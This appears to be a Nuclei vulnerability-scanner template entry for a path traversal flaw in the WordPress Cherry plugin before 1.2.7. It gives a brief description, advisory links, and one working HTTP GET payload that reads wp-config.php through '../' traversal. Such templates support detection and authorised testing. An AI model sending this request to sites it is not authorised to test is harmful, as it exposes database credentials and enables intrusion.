# Nuclei Template: WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download
**Template ID:** cherry-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`cherry-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress plugin Cherry < 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee
- https://support.alertlogic.com/hc/en-us/articles/115003048083-06-19-17-WordPress-CMS-Cherry-Plugin-Arbitrary-File-Upload-RCE
